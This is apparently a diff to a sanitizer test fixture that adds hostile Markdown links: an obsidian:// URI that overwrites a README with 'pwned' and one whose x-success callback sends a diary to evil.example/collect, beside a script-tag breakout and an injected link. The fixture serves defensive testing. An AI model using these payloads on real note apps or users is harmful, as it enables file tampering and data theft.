@@ -40,6 +40,10 @@ Script-block breakout: </script><script>window.__BREAKOUT=true;</script> and the
 
 <span class="wikilink" data-raw="INJECTEDRAW [pay](https://evil.example/pay)">harmless looking words</span>
 
+[open the README](obsidian://new?vault=Notes&name=README&content=pwned&overwrite=true)
+
+[open my diary](obsidian://open?vault=Notes&file=diary&x-success=https://evil.example/collect)
+
 <style>
 
 KEEP-1 text after an unclosed style tag must still be in the file.
